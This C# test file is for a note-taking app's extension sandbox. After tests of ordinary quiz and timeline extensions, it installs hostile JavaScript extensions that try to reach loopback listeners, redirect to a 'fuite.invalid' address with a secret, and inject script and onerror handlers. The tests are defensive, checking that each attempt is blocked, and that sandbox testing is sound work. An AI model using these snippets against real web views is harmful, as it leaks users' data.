using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text.Json;
using KyfRev.Application;
using KyfRev.Extensions.Host;
using KyfRev.Presentation.Wpf.Extensions;

namespace KyfRev.Presentation.Wpf.Tests;

/// <summary>Le code des extensions, dans le vrai moteur : les quatre publiées, telles quelles, puis des extensions qui cherchent à sortir de leur cadre.</summary>
[TestClass]
public sealed class ExtensionEngineTests
{
    private static readonly TimeSpan Long = TimeSpan.FromMinutes(2);

    private static string Published => Path.Combine(Repository.Root, "tests", "fixtures", "extensions");

    private static string Official => Path.Combine(Repository.Root, "extensions");

    [EngineTest]
    public void Quiz_draws_its_block_and_its_view_and_keeps_its_score()
    {
        using var scene = new Scene();
        scene.Publish("quiz");
        scene.Data.Text = "```quiz\nQ: Qui convoque les états généraux ?\nR: Louis XVI\n```\n";
        using var ui = new UiThread();

        var block = Wait(scene.Engine.RenderBlockAsync("quiz", "quiz", "Q: Combien d'ordres ?\nR: Trois", dark: false));
        Assert.IsTrue(block.Succeeded, block.Error);
        StringAssert.Contains(block.Content!.Text, "Quiz · 1 question", StringComparison.Ordinal);
        StringAssert.Contains(block.Content!.Text, "Trois", StringComparison.Ordinal);

        var view = Wait(scene.Engine.RenderViewAsync("quiz", dark: false));
        Assert.IsTrue(view.Succeeded, view.Error);
        StringAssert.Contains(view.Content!.Text, "Qui convoque", StringComparison.Ordinal);

        Assert.IsTrue(Wait(scene.Engine.ActAsync("quiz", "afficher", null, new Dictionary<string, string>())).Succeeded);
        StringAssert.Contains(TextOf(scene, "quiz"), "Louis XVI", StringComparison.Ordinal);

        Assert.IsTrue(Wait(scene.Engine.ActAsync("quiz", "resultat", "su", new Dictionary<string, string> { ["valeur"] = "su" })).Succeeded);
        Assert.IsNotNull(scene.Data.Stored, "Le score passe par l'hôte, qui l'écrit dans le coffre.");
    }

    [EngineTest]
    public void Quiz_2_takes_its_questions_in_a_sheet_plays_them_and_brings_back_the_missed_ones()
    {
        using var scene = new Scene();
        Assert.IsTrue(scene.Library.Install(Path.Combine(Official, "quiz")).Succeeded);
        scene.Data.Text = "Qu'est-ce que l'autorité ?\n\nUn pouvoir.\n";
        var screen = new FakeScreen();
        screen.Answers.Enqueue(new GuidedSelection(GuidedSelection.Taken, "Qu'est-ce que l'autorité ?", "f_1", "Une fiche", 0, 26));
        screen.Answers.Enqueue(new GuidedSelection(GuidedSelection.Typed, "Un pouvoir reconnu"));
        screen.Answers.Enqueue(new GuidedSelection(GuidedSelection.Taken, "Un exemple ?", "f_1", "Une fiche", 28, 40));
        screen.Answers.Enqueue(new GuidedSelection(GuidedSelection.Skipped));
        screen.Answers.Enqueue(new GuidedSelection(GuidedSelection.Stopped));
        scene.Engine.Screen = screen;
        using var ui = new UiThread();
        var none = new Dictionary<string, string>();

        StringAssert.Contains(TextOf(scene, "quiz"), "Aucun quiz pour l'instant", StringComparison.Ordinal);
        Assert.IsTrue(Wait(scene.Engine.CommandAsync("quiz", "nouveau", none)).Succeeded);
        StringAssert.Contains(TextOf(scene, "quiz"), "Fiche de départ", StringComparison.Ordinal);

        var form = new Dictionary<string, object?> { ["nom"] = "Autorité", ["etiquettes"] = "philo", ["fiche"] = "f_1", ["ordre"] = "fiche", ["mode"] = "fiche" };
        var created = Wait(scene.Engine.ActAsync("quiz", "creer", form, none));

        Assert.IsTrue(created.Succeeded, created.Error);
        Assert.HasCount(5, screen.Asks);
        Assert.AreEqual(new SelectionAsk("Quiz", "Autorité · question 1 : sélectionnez la question", "f_1", AllowsTyping: true), screen.Asks[0]);
        StringAssert.Contains(screen.Asks[1].Prompt, "sélectionnez la réponse", StringComparison.Ordinal);
        var edit = TextOf(scene, "quiz");
        StringAssert.Contains(edit, "2 questions prises dans la fiche", StringComparison.Ordinal);
        StringAssert.Contains(edit, "Un pouvoir reconnu", StringComparison.Ordinal);

        using var stored = JsonDocument.Parse(scene.Data.Stored!);
        var quiz = stored.RootElement.GetProperty("quiz")[0];
        var data = new Dictionary<string, string> { ["quiz"] = quiz.GetProperty("id").GetString()! };
        Assert.IsTrue(Wait(scene.Engine.ActAsync("quiz", "lancer", null, data)).Succeeded);
        StringAssert.Contains(TextOf(scene, "quiz"), "Question 1 sur 2", StringComparison.Ordinal);
        Wait(scene.Engine.ActAsync("quiz", "afficher", null, none));
        Wait(scene.Engine.ActAsync("quiz", "a-revoir", null, none));
        Wait(scene.Engine.ActAsync("quiz", "afficher", null, none));
        Wait(scene.Engine.ActAsync("quiz", "savais", null, none));
        StringAssert.Contains(TextOf(scene, "quiz"), "Terminé : 1 sur 2", StringComparison.Ordinal);
        Assert.AreEqual(1, Wait(scene.Engine.CountAsync("quiz")));
        Assert.AreEqual("1 question à revoir", Wait(scene.Engine.CardAsync("quiz"))!.Value.Text);

        Wait(scene.Engine.ActAsync("quiz", "rejouer-ratees", null, none));
        var again = TextOf(scene, "quiz");
        StringAssert.Contains(again, "Question 1 sur 1", StringComparison.Ordinal);
        StringAssert.Contains(again, "Qu'est-ce que l'autorité ?", StringComparison.Ordinal);
        var question = quiz.GetProperty("questions")[0].GetProperty("id").GetString()!;
        Assert.IsTrue(Wait(scene.Engine.ActAsync("quiz", "voir", null, new Dictionary<string, string>(data) { ["question"] = question })).Succeeded);
        Assert.AreEqual("f_1 0 26", screen.Opened.Single(), "« Voir dans la fiche » rouvre le passage d'où vient la question.");
        Wait(scene.Engine.ActAsync("quiz", "afficher", null, none));
        Wait(scene.Engine.ActAsync("quiz", "savais", null, none));
        Assert.IsNull(Wait(scene.Engine.CountAsync("quiz")));
        Assert.IsNull(Wait(scene.Engine.CardAsync("quiz")));
    }

    [EngineTest]
    public void Quiz_2_adds_a_selected_text_and_turns_the_old_blocks_into_quizzes()
    {
        using var scene = new Scene();
        Assert.IsTrue(scene.Library.Install(Path.Combine(Official, "quiz")).Succeeded);
        scene.Data.Text = "```quiz\nQ: Qui convoque les états généraux ?\nR: Louis XVI\n```\n";
        scene.Data.Keep("""{"sues":3}""");
        var screen = new FakeScreen();
        screen.Answers.Enqueue(new GuidedSelection(GuidedSelection.Taken, "Le roi", "f_1", "Une fiche", 40, 46));
        scene.Engine.Screen = screen;
        using var ui = new UiThread();
        var none = new Dictionary<string, string>();

        var list = TextOf(scene, "quiz");
        StringAssert.Contains(list, "Trouvés dans vos fiches", StringComparison.Ordinal);
        StringAssert.Contains(list, "Une fiche · 1 question", StringComparison.Ordinal);
        Assert.IsTrue(Wait(scene.Engine.ActAsync("quiz", "importer", null, new Dictionary<string, string> { ["fiche"] = "f_1" })).Succeeded);
        var imported = TextOf(scene, "quiz");
        StringAssert.Contains(imported, "Quiz « Une fiche » créé, avec 1 question", StringComparison.Ordinal);
        Assert.IsFalse(imported.Contains("Trouvés dans vos fiches", StringComparison.Ordinal));

        Assert.IsTrue(Wait(scene.Engine.CommandAsync("quiz", "ajouter", new Dictionary<string, string> { ["id"] = "f_1", ["titre"] = "Une fiche", ["texte"] = "Qui règne ?", ["debut"] = "20", ["fin"] = "31" })).Succeeded);
        StringAssert.Contains(TextOf(scene, "quiz"), "Ajouter au quiz", StringComparison.Ordinal);
        using (var before = JsonDocument.Parse(scene.Data.Stored!))
        {
            var id = before.RootElement.GetProperty("quiz")[0].GetProperty("id").GetString();
            var added = Wait(scene.Engine.ActAsync("quiz", "ajout", new Dictionary<string, object?> { ["quiz"] = id, ["question"] = "Qui règne ?", ["reponse"] = "" }, none));
            Assert.IsTrue(added.Succeeded, added.Error);
        }

        StringAssert.Contains(screen.Asks.Single().Prompt, "sélectionnez la réponse à « Qui règne ? »", StringComparison.Ordinal);
        StringAssert.Contains(TextOf(scene, "quiz"), "Question ajoutée au quiz « Une fiche » (2 questions)", StringComparison.Ordinal);
        using var stored = JsonDocument.Parse(scene.Data.Stored!);
        var question = stored.RootElement.GetProperty("quiz")[0].GetProperty("questions")[1];
        Assert.AreEqual("Le roi", question.GetProperty("reponse").GetString());
        Assert.AreEqual(20, question.GetProperty("debut").GetInt32(), "La question garde la place du texte sélectionné.");
        Assert.AreEqual(3, stored.RootElement.GetProperty("ancien").GetProperty("sues").GetInt32(), "Le score de la version 1 est gardé à part.");

        Assert.IsTrue(Wait(scene.Engine.CommandAsync("quiz", "ajouter", none)).Succeeded);
        StringAssert.Contains(TextOf(scene, "quiz"), "Sélectionnez un texte dans une fiche", StringComparison.Ordinal);
    }

    [EngineTest]
    public void Chronology_2_composes_timelines_from_a_selection_and_from_the_dates_of_a_sheet()
    {
        using var scene = new Scene();
        Assert.IsTrue(scene.Library.Install(Path.Combine(Official, "chronologie")).Succeeded);
        scene.Data.Text = "Le 14 juillet 1789, prise de la Bastille. En 1792, la République est proclamée.\n\n```chronologie\n52 av. J.-C. : Bataille d'Alésia\n```\n";
        var screen = new FakeScreen();
        scene.Engine.Screen = screen;
        using var ui = new UiThread();
        var none = new Dictionary<string, string>();

        StringAssert.Contains(TextOf(scene, "chronologie"), "Aucune frise pour l'instant", StringComparison.Ordinal);
        Assert.IsTrue(Wait(scene.Engine.CommandAsync("chronologie", "extraire", new Dictionary<string, string> { ["id"] = "f_1", ["titre"] = "Une fiche" })).Succeeded);
        var found = TextOf(scene, "chronologie");
        StringAssert.Contains(found, "2 dates trouvées dans « Une fiche »", StringComparison.Ordinal);
        var kept = Wait(scene.Engine.ActAsync("chronologie", "garder", new Dictionary<string, object?>
        {
            ["frise"] = "nouvelle",
            ["nouvelle"] = "Révolution",
            ["c0"] = true,
            ["d0"] = "14 juillet 1789",
            ["t0"] = "Prise de la Bastille",
            ["c1"] = false,
        }, none));
        Assert.IsTrue(kept.Succeeded, kept.Error);
        StringAssert.Contains(TextOf(scene, "chronologie"), "1 date ajoutée depuis « Une fiche »", StringComparison.Ordinal);

        Assert.IsTrue(Wait(scene.Engine.CommandAsync("chronologie", "ajouter", new Dictionary<string, string>
        {
            ["id"] = "f_1",
            ["titre"] = "Une fiche",
            ["texte"] = "En 1792, la République est proclamée.",
            ["debut"] = "42",
            ["fin"] = "80",
        })).Succeeded);
        StringAssert.Contains(TextOf(scene, "chronologie"), "Ajouter à la frise", StringComparison.Ordinal);
        using (var before = JsonDocument.Parse(scene.Data.Stored!))
        {
            var frise = before.RootElement.GetProperty("frises")[0].GetProperty("id").GetString();
            Assert.IsTrue(Wait(scene.Engine.ActAsync("chronologie", "ajout", new Dictionary<string, object?> { ["frise"] = frise, ["date"] = "22 septembre 1792", ["texte"] = "Proclamation de la République" }, none)).Succeeded);
        }

        using var stored = JsonDocument.Parse(scene.Data.Stored!);
        var timeline = stored.RootElement.GetProperty("frises")[0];
        var dates = timeline.GetProperty("evenements").EnumerateArray().Select(e => e.GetProperty("date").GetString()).ToList();
        Assert.AreEqual("14 juillet 1789 | 22 septembre 1792", string.Join(" | ", dates));
        var data = new Dictionary<string, string> { ["frise"] = timeline.GetProperty("id").GetString()!, ["date"] = timeline.GetProperty("evenements")[1].GetProperty("id").GetString()! };
        Assert.IsTrue(Wait(scene.Engine.ActAsync("chronologie", "voir", null, data)).Succeeded);
        Assert.AreEqual("f_1 42 80", screen.Opened.Single(), "« Voir dans la fiche » rouvre le passage sélectionné.");

        Wait(scene.Engine.ActAsync("chronologie", "jouer", null, data));
        StringAssert.Contains(TextOf(scene, "chronologie"), "du plus ancien au plus récent", StringComparison.Ordinal);
        var first = timeline.GetProperty("evenements")[0].GetProperty("id").GetString()!;
        Wait(scene.Engine.ActAsync("chronologie", "placer", null, new Dictionary<string, string> { ["date"] = first }));
        Wait(scene.Engine.ActAsync("chronologie", "placer", null, data));
        StringAssert.Contains(TextOf(scene, "chronologie"), "Terminé : 2 sur 2 à la bonne place", StringComparison.Ordinal);

        Wait(scene.Engine.ActAsync("chronologie", "blocs", null, none));
        StringAssert.Contains(TextOf(scene, "chronologie"), "Bataille d'Alésia", StringComparison.Ordinal);
        var block = Wait(scene.Engine.RenderBlockAsync("chronologie", "chronologie", "1789 : Prise de la Bastille", dark: false));
        StringAssert.Contains(block.Content!.Text, "Prise de la Bastille", StringComparison.Ordinal);
    }

    [EngineTest]
    public void Vocabulary_2_adds_a_selected_word_with_its_sentence_and_brings_it_back_on_the_sheets_cycle()
    {
        using var scene = new Scene();
        Assert.IsTrue(scene.Library.Install(Path.Combine(Official, "vocabulaire")).Succeeded);
        scene.Data.Text = "Today the weather is nice. It rains.\n\n```vocabulaire\nthe cat = le chat\n```\n";
        scene.Data.Keep("""{"the cat":{"sus":2,"aRevoir":1}}""");
        var screen = new FakeScreen();
        scene.Engine.Screen = screen;
        using var ui = new UiThread();
        var none = new Dictionary<string, string>();

        StringAssert.Contains(TextOf(scene, "vocabulaire"), "Aucun carnet pour l'instant", StringComparison.Ordinal);
        Assert.IsNull(Wait(scene.Engine.CountAsync("vocabulaire")));
        Assert.IsTrue(Wait(scene.Engine.CommandAsync("vocabulaire", "ajouter", new Dictionary<string, string>
        {
            ["id"] = "f_1",
            ["titre"] = "Une fiche",
            ["texte"] = "the weather",
            ["debut"] = "6",
            ["fin"] = "17",
        })).Succeeded);
        var form = TextOf(scene, "vocabulaire");
        StringAssert.Contains(form, "Today the weather is nice.", StringComparison.Ordinal);
        var added = Wait(scene.Engine.ActAsync("vocabulaire", "ajout", new Dictionary<string, object?>
        {
            ["carnet"] = "nouveau",
            ["nouveau"] = "Anglais",
            ["terme"] = "the weather",
            ["traduction"] = "le temps (qu'il fait)",
            ["phrase"] = "Today the weather is nice.",
        }, none));
        Assert.IsTrue(added.Succeeded, added.Error);
        StringAssert.Contains(TextOf(scene, "vocabulaire"), "« the weather » ajouté au carnet « Anglais »", StringComparison.Ordinal);
        Assert.AreEqual(1, Wait(scene.Engine.CountAsync("vocabulaire")));
        Assert.AreEqual("1 mot à revoir", Wait(scene.Engine.CardAsync("vocabulaire"))!.Value.Text);

        using var stored = JsonDocument.Parse(scene.Data.Stored!);
        var book = stored.RootElement.GetProperty("carnets")[0];
        Assert.AreEqual(1, stored.RootElement.GetProperty("ancien").GetProperty("the cat").GetProperty("aRevoir").GetInt32(), "Les résultats de la version 1 sont gardés.");
        var data = new Dictionary<string, string> { ["carnet"] = book.GetProperty("id").GetString()!, ["mot"] = book.GetProperty("mots")[0].GetProperty("id").GetString()! };
        Wait(scene.Engine.ActAsync("vocabulaire", "mode", null, data));
        Wait(scene.Engine.ActAsync("vocabulaire", "reviser", null, data));
        StringAssert.Contains(TextOf(scene, "vocabulaire"), "Vérifier", StringComparison.Ordinal);
        Wait(scene.Engine.ActAsync("vocabulaire", "verifier", new Dictionary<string, object?> { ["reponse"] = "Le temps !" }, none));
        StringAssert.Contains(TextOf(scene, "vocabulaire"), "Juste.", StringComparison.Ordinal);
        Wait(scene.Engine.ActAsync("vocabulaire", "suivant", null, none));
        StringAssert.Contains(TextOf(scene, "vocabulaire"), "Terminé : 1 sur 1", StringComparison.Ordinal);
        Assert.IsNull(Wait(scene.Engine.CountAsync("vocabulaire")), "Su, le mot revient à J1 : plus rien à revoir aujourd'hui.");
        using (var after = JsonDocument.Parse(scene.Data.Stored!))
        {
            var word = after.RootElement.GetProperty("carnets")[0].GetProperty("mots")[0];
            Assert.AreEqual(DateTime.Now.AddDays(1).ToString("yyyy-MM-dd", System.Globalization.CultureInfo.InvariantCulture), word.GetProperty("prochaine").GetString());
            Assert.AreEqual(1, word.GetProperty("etape").GetInt32());
        }

        Assert.IsTrue(Wait(scene.Engine.ActAsync("vocabulaire", "voir", null, data)).Succeeded);
        Assert.AreEqual("f_1 6 17", screen.Opened.Single());
        Wait(scene.Engine.ActAsync("vocabulaire", "blocs", null, none));
        StringAssert.Contains(TextOf(scene, "vocabulaire"), "1 mot dans les blocs vocabulaire", StringComparison.Ordinal);
        Assert.IsTrue(Wait(scene.Engine.ActAsync("vocabulaire", "importer", new Dictionary<string, object?> { ["carnet"] = data["carnet"] }, none)).Succeeded);
        StringAssert.Contains(TextOf(scene, "vocabulaire"), "1 mot ajouté depuis les blocs", StringComparison.Ordinal);
    }

    [EngineTest]
    public void Bilan_2_tags_a_sheet_in_place_ignores_another_and_counts_those_to_flesh_out()
    {
        using var scene = new Scene();
        Assert.IsTrue(scene.Library.Install(Path.Combine(Official, "bilan")).Succeeded);
        scene.Data.Text = "Trois petits mots.";
        var screen = new FakeScreen();
        scene.Engine.Screen = screen;
        using var ui = new UiThread();

        var text = TextOf(scene, "bilan");
        StringAssert.Contains(text, "1 fiche active", StringComparison.Ordinal);
        StringAssert.Contains(text, "À étoffer", StringComparison.Ordinal);
        Assert.AreEqual("1 fiche à étoffer", Wait(scene.Engine.CardAsync("bilan"))!.Value.Text);

        var tagged = Wait(scene.Engine.ActAsync("bilan", "etiqueter", "#révision", new Dictionary<string, string> { ["fiche"] = "f_1" }));
        Assert.IsTrue(tagged.Succeeded, tagged.Error);
        Assert.AreEqual("etiqueter f_1 révision", scene.Data.Writes.Single(), "Une étiquette s'ajoute sur place, par la permission « fiches:creation ».");
        StringAssert.Contains(TextOf(scene, "bilan"), "Étiquette « révision » ajoutée à « Une fiche »", StringComparison.Ordinal);

        Assert.IsTrue(Wait(scene.Engine.ActAsync("bilan", "ouvrir", null, new Dictionary<string, string> { ["fiche"] = "f_1" })).Succeeded);
        Assert.AreEqual("f_1 - -", screen.Opened.Single());

        Wait(scene.Engine.ActAsync("bilan", "ignorer", null, new Dictionary<string, string> { ["fiche"] = "f_1" }));
        StringAssert.Contains(TextOf(scene, "bilan"), "« Une fiche » est ignorée", StringComparison.Ordinal);
        Assert.IsNull(Wait(scene.Engine.CardAsync("bilan")), "Une fiche ignorée n'est plus à étoffer.");
        using var stored = JsonDocument.Parse(scene.Data.Stored!);
        Assert.AreEqual("f_1", stored.RootElement.GetProperty("ignorees")[0].GetString());
        Assert.AreEqual(1, stored.RootElement.GetProperty("semaines").GetArrayLength(), "Le bilan de la semaine est gardé.");
    }

    [EngineTest]
    public void A_created_extension_runs_as_it_is()
    {
        using var scene = new Scene();
        var parent = Path.Combine(Path.GetTempPath(), "kyfrev-creee-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(parent);
        try
        {
            var created = ExtensionTemplate.Create(parent, []);
            Assert.IsTrue(scene.Library.Install(created.Value).Succeeded);
            using var ui = new UiThread();

            StringAssert.Contains(TextOf(scene, ExtensionTemplate.BaseId), "Votre coffre compte 1 fiche(s), dont 0 archivée(s).", StringComparison.Ordinal);
            Assert.IsTrue(Wait(scene.Engine.ActAsync(ExtensionTemplate.BaseId, "compter", null, new Dictionary<string, string>())).Succeeded);
            StringAssert.Contains(TextOf(scene, ExtensionTemplate.BaseId), "Le compteur vaut 1", StringComparison.Ordinal);
            Assert.IsTrue(Wait(scene.Engine.CommandAsync(ExtensionTemplate.BaseId, "bonjour", new Dictionary<string, string>())).Succeeded);
            StringAssert.Contains(TextOf(scene, ExtensionTemplate.BaseId), "Bonjour !", StringComparison.Ordinal);
            Assert.IsEmpty(scene.Engine.Faults(ExtensionTemplate.BaseId));
        }
        finally
        {
            Directory.Delete(parent, recursive: true);
        }
    }

    [EngineTest]
    public void The_engine_keeps_the_last_faults_of_each_extension_for_the_developer()
    {
        using var scene = new Scene();
        scene.Install("fautive", """
            kyfrev.vue(() => { throw new Error("boum dans la vue"); });
            kyfrev.action("casser", () => { throw new Error("boum dans l'action"); });
            """);
        using var ui = new UiThread();
        var changed = new List<string>();
        scene.Engine.FaultsChanged += (_, e) => changed.Add(e.Extension);

        Assert.IsFalse(Wait(scene.Engine.RenderViewAsync("fautive", dark: false)).Succeeded);
        Assert.IsFalse(Wait(scene.Engine.ActAsync("fautive", "casser", null, new Dictionary<string, string>())).Succeeded);

        var faults = scene.Engine.Faults("fautive");
        Assert.HasCount(2, faults);
        Assert.AreEqual("action « casser »", faults[0].Where, "La plus récente d'abord.");
        StringAssert.Contains(faults[0].Message, "boum dans l'action", StringComparison.Ordinal);
        Assert.IsFalse(faults[0].Message.StartsWith("extension « fautive »", StringComparison.Ordinal), "Son nom ne se répète pas sous elle : " + faults[0].Message);
        Assert.AreEqual("vue", faults[1].Where);
        Assert.AreEqual("fautive fautive", string.Join(' ', changed));
        Assert.IsEmpty(scene.Engine.Faults("absente"));

        scene.Engine.ForgetFaults("fautive");
        Assert.IsEmpty(scene.Engine.Faults("fautive"));
        scene.Engine.ForgetFaults("fautive");
        Assert.HasCount(3, changed, "Oublier ce qui n'y est plus ne dit rien.");
        for (var i = 0; i < ExtensionEngine.MaxFaults + 3; i++)
        {
            Wait(scene.Engine.ActAsync("fautive", "casser", null, new Dictionary<string, string>()));
        }
        Assert.HasCount(ExtensionEngine.MaxFaults, scene.Engine.Faults("fautive"));
    }

    [EngineTest]
    public void Chronology_gathers_the_dates_of_the_sheets()
    {
        using var scene = new Scene();
        scene.Publish("chronologie");
        scene.Data.Text = "```chronologie\n1792 : Proclamation de la République\n1789 : Prise de la Bastille\n```\n";
        using var ui = new UiThread();

        var block = Wait(scene.Engine.RenderBlockAsync("chronologie", "chronologie", "1789 : Prise de la Bastille", dark: true));
        StringAssert.Contains(block.Content!.Text, "Prise de la Bastille", StringComparison.Ordinal);

        var text = TextOf(scene, "chronologie");
        Assert.IsLessThan(text.IndexOf("Proclamation", StringComparison.Ordinal), text.IndexOf("Bastille", StringComparison.Ordinal), "De la plus ancienne à la plus récente.");
    }

    [EngineTest]
    public void Vocabulary_asks_its_words_and_keeps_its_results()
    {
        using var scene = new Scene();
        scene.Publish("vocabulaire");
        scene.Data.Text = "```vocabulaire\nthe cat = le chat\n```\n";
        using var ui = new UiThread();

        Assert.IsTrue(Wait(scene.Engine.RenderBlockAsync("vocabulaire", "vocabulaire", "the cat = le chat", dark: false)).Content!.Descendants().Any(node => node.Tag == "details"));
        StringAssert.Contains(TextOf(scene, "vocabulaire"), "the cat", StringComparison.Ordinal);

        Wait(scene.Engine.ActAsync("vocabulaire", "afficher", null, new Dictionary<string, string>()));
        StringAssert.Contains(TextOf(scene, "vocabulaire"), "le chat", StringComparison.Ordinal);

        Assert.IsTrue(Wait(scene.Engine.ActAsync("vocabulaire", "resultat", "su", new Dictionary<string, string>())).Succeeded);
        StringAssert.Contains(scene.Data.Stored, "the cat", StringComparison.Ordinal);
    }

    [EngineTest]
    public void The_report_reads_the_sheets_and_counts_again()
    {
        using var scene = new Scene();
        scene.Publish("bilan");
        scene.Data.Text = "Un texte de quelques mots.";
        using var ui = new UiThread();

        var view = Wait(scene.Engine.RenderViewAsync("bilan", dark: false));
        Assert.IsTrue(view.Succeeded, view.Error);
        Assert.AreEqual("Bilan du coffre", view.Content!.Descendants().First(node => node.Tag == "h1").AllText);
        StringAssert.Contains(view.Content!.Text, "1 fiche(s) active(s)", StringComparison.Ordinal);
        Assert.IsTrue(view.Content!.Descendants().Any(node => node.Action == "recalculer"));

        scene.Data.Text = "Un texte de quelques mots, avec beaucoup plus de mots encore.";
        StringAssert.Contains(TextOf(scene, "bilan"), "5 mots", StringComparison.Ordinal);
        Assert.IsTrue(Wait(scene.Engine.ActAsync("bilan", "recalculer", null, new Dictionary<string, string>())).Succeeded);
        StringAssert.Contains(TextOf(scene, "bilan"), "11 mots", StringComparison.Ordinal);
    }

    [EngineTest]
    public void Without_its_permission_an_extension_is_refused_by_the_host()
    {
        using var scene = new Scene();
        scene.Install("sans-droit", """
            kyfrev.vue(async () => {
              const essais = [];
              for (const demande of [() => kyfrev.fiches.lister(), () => kyfrev.stockage.lire()]) {
                try { await demande(); essais.push("permis"); } catch (e) { essais.push(e.message); }
              }
              return essais.join(" | ");
            });
            """);
        using var ui = new UiThread();

        var html = TextOf(scene, "sans-droit");

        StringAssert.Contains(html, "permission « fiches:lecture »", StringComparison.Ordinal);
        StringAssert.Contains(html, "permission « stockage »", StringComparison.Ordinal);
        Assert.AreEqual(0, scene.Data.Calls);
    }

    [EngineTest]
    public void An_extension_creates_tags_and_writes_sheets_through_the_host()
    {
        using var scene = new Scene();
        var source = Path.Combine(Path.GetTempPath(), "kyfrev-ecrivain-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(source);
        try
        {
            File.WriteAllText(Path.Combine(source, ExtensionManifest.FileName), """
                {"api":2,"id":"ecrivain","nom":"Écrivain","version":"1","permissions":["fiches:creation","fiches:ecriture"],"vue":{"titre":"Écrivain"}}
                """);
            File.WriteAllText(Path.Combine(source, "extension.js"), """
                kyfrev.vue(async () => {
                  const id = await kyfrev.fiches.creer("Nouvelle", { dossier: "Cours", texte: "Bonjour", etiquettes: ["a", "b"] });
                  const etiquettes = await kyfrev.fiches.etiqueter(id, ["c"]);
                  const ecrit = await kyfrev.fiches.ecrire(id, "Au revoir");
                  let supprimer = "absent";
                  try { kyfrev.fiches.supprimer(id); supprimer = "présent"; } catch { }
                  return `<p>${id} ${etiquettes.join(",")} ${ecrit} ${supprimer}</p>`;
                });
                """);
            Assert.IsTrue(scene.Library.Install(source).Succeeded);
            using var ui = new UiThread();

            Assert.AreEqual("f_2 c null absent", TextOf(scene, "ecrivain"));
            Assert.AreEqual("creer Nouvelle Cours Bonjour a,b | etiqueter f_2 c | ecrire f_2 Au revoir", string.Join(" | ", scene.Data.Writes));
        }
        finally
        {
            Directory.Delete(source, recursive: true);
        }
    }

    [EngineTest]
    public void An_extension_reaches_no_network()
    {
        // De vrais écouteurs sur cette machine : ce qui sortirait du cadre arriverait ici, quelle que soit la raison qui l'a laissé passer.
        using var tcp = new TcpListener(IPAddress.Loopback, 0);
        tcp.Start();
        var port = ((IPEndPoint)tcp.LocalEndpoint).Port;
        using var udp = new UdpClient(new IPEndPoint(IPAddress.Loopback, 0));
        var address = $"127.0.0.1:{port}";
        var stun = $"127.0.0.1:{((IPEndPoint)udp.Client.LocalEndPoint!).Port}";
        using var scene = new Scene();
        scene.Install("reseau", $$"""
            const essai = async (nom, faire) => {
              try { await faire(); return `${nom}: passe`; } catch (e) { return `${nom}: bloque`; }
            };
            const attendre = (cible, ouvert) => new Promise((ok, non) => { cible[ouvert] = ok; cible.onerror = non; });
            const lien = (rel) => { const l = document.createElement("link"); l.rel = rel; l.href = "http://{{address}}/lien"; document.head.append(l); };
            const liaison = (Liaison) => new Promise(async (ok, non) => {
              try {
                const pair = new Liaison({ iceServers: [{ urls: "stun:{{stun}}" }] });
                const candidats = [];
                pair.onicecandidate = (e) => { if (e.candidate) candidats.push(e.candidate.candidate); };
                pair.createDataChannel("fuite");
                await pair.setLocalDescription(await pair.createOffer());
                setTimeout(() => ok(candidats.join("/")), 2500);
              } catch (e) { non(e); }
            });
            const interne = () => { const f = document.createElement("iframe"); document.body.append(f); return f.contentWindow.RTCPeerConnection; };
            kyfrev.vue(async () => (await Promise.all([
              essai("fetch", () => fetch("http://{{address}}/fetch")),
              essai("xhr", () => new Promise((ok, non) => { const x = new XMLHttpRequest(); x.onload = ok; x.onerror = non; x.open("GET", "http://{{address}}/xhr"); x.send(); })),
              essai("image", () => { const i = new Image(); const fin = attendre(i, "onload"); i.src = "http://{{address}}/image.png"; return fin; }),
              essai("prise", () => attendre(new WebSocket("ws://{{address}}/prise"), "onopen")),
              essai("script", () => { const s = document.createElement("script"); const fin = attendre(s, "onload"); s.src = "http://{{address}}/x.js"; document.body.append(s); return fin; }),
              // Un piège : la politique du cadre doit refuser eval.
              essai("eval", () => eval("1")),
              essai("worker", () => { const w = new Worker("data:text/javascript,postMessage(1)"); return attendre(w, "onmessage"); }),
              essai("balise", () => navigator.sendBeacon("http://{{address}}/balise", "x")),
              essai("liens", () => { lien("preconnect"); lien("dns-prefetch"); lien("prefetch"); }),
              essai("liaison", () => liaison(RTCPeerConnection)),
              essai("liaison-interne", () => liaison(interne())),
            ])).join(" | "));
            """);
        using var ui = new UiThread();

        var answer = Wait(scene.Engine.RenderViewAsync("reseau", dark: false));
        Pump(TimeSpan.FromMilliseconds(500));

        Assert.IsTrue(answer.Succeeded, answer.Error);
        foreach (var tried in new[] { "fetch", "xhr", "image", "prise", "script", "eval", "worker", "liaison", "liaison-interne" })
        {
            StringAssert.Contains(answer.Content!.Text, $"{tried}: bloque", StringComparison.Ordinal);
        }
        Assert.IsFalse(tcp.Pending(), "Une connexion est sortie du cadre.");
        Assert.AreEqual(0, udp.Available, "Un paquet est sorti du cadre.");
    }

    [EngineTest]
    public void A_frame_cannot_leave_its_address()
    {
        using var scene = new Scene();
        scene.Install("depart", """
            kyfrev.vue(() => "encore la");
            kyfrev.action("partir", () => { location.href = "https://fuite.invalid/?secret=1"; });
            """);
        using var ui = new UiThread();
        Wait(scene.Engine.RenderViewAsync("depart", dark: false));

        Wait(scene.Engine.ActAsync("depart", "partir", null, new Dictionary<string, string>()));
        UiThread.Until(() => scene.Engine.Refused.Any(address => address.Contains("fuite.invalid", StringComparison.Ordinal)), Long);
        scene.Engine.Patience = TimeSpan.FromSeconds(2);

        // Le cadre a perdu son document : il ne répond plus, et le moteur repart sans lui.
        Wait(scene.Engine.RenderViewAsync("depart", dark: false));

        scene.Engine.Patience = TimeSpan.FromSeconds(30);
        Assert.AreEqual("encore la", TextOf(scene, "depart"));
    }

    [EngineTest]
    public void What_an_extension_draws_goes_through_the_white_list_and_loads_nothing()
    {
        using var tcp = new TcpListener(IPAddress.Loopback, 0);
        tcp.Start();
        var address = $"http://127.0.0.1:{((IPEndPoint)tcp.LocalEndpoint).Port}";
        using var scene = new Scene();
        scene.Install("hostile", $$"""
            kyfrev.vue(() => `
              <h1 onclick="fuite()" style="position:fixed;inset:0;z-index:9999">Faux dialogue</h1>
              <script>window.piege = 1;</script>
              <style>body { display: none; }</style>
              <img src="{{address}}/image.png?secret=1" alt="le texte de l'image" onerror="fuite()">
              <a href="{{address}}/lien?secret=1" data-externe="{{address}}/externe?secret=1" target="_blank">un lien</a>
              <iframe src="{{address}}/cadre" srcdoc="<script>fuite()</script>">secret du cadre</iframe>
